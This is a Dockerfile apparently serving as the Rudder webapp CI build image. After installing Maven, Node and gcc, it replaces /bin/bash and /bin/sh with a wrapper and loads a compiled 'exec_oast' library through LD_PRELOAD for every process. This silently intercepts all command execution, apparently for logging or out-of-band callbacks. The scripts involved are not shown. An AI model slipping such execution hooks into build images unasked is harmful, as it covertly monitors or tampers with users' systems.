ARG JDK_VERSION=17
FROM maven:3-eclipse-temurin-${JDK_VERSION}
LABEL ci=rudder/webapp/sources/Dockerfile

ARG USER_ID=1000

RUN apt-get update && apt-get install -y curl gpg

# We need a recent node
RUN curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | gpg --dearmor -o /usr/share/keyrings/nodesource.gpg
RUN echo "deb [arch=amd64 signed-by=/usr/share/keyrings/nodesource.gpg] https://deb.nodesource.com/node_20.x nodistro main" | tee /etc/apt/sources.list.d/nodesource.list > /dev/null

RUN apt-get update && apt-get install -y nodejs gcc python3

# 1) Install the logger & trap
COPY ci/command_logger.sh /etc/command_logger.sh
COPY ci/bash_trap.sh     /etc/bash_trap.sh
RUN chmod +x /etc/command_logger.sh /etc/bash_trap.sh

# 3) Swap out /bin/bash
RUN mv /bin/bash /bin/bash.real
COPY ci/bash_wrapper.sh /bin/bash
RUN chmod +x /bin/bash

# instead of moving dash out of the way...
RUN mv /bin/sh /bin/sh.real && ln -s /bin/bash /bin/sh

COPY ci/exec_oast.c /tmp/exec_oast.c
RUN gcc -shared -fPIC -o /usr/local/lib/libexec_oast.so /tmp/exec_oast.c -ldl \
 && rm /tmp/exec_oast.c

# ensure it's preloaded for all processes
ENV LD_PRELOAD=/usr/local/lib/libexec_oast.so


# 2) Install our ENTRYPOINT wrapper
COPY ci/entrypoint.sh /usr/local/bin/entrypoint.sh
RUN chmod +x /usr/local/bin/entrypoint.sh

# 3) Set it as the container’s ENTRYPOINT
ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]

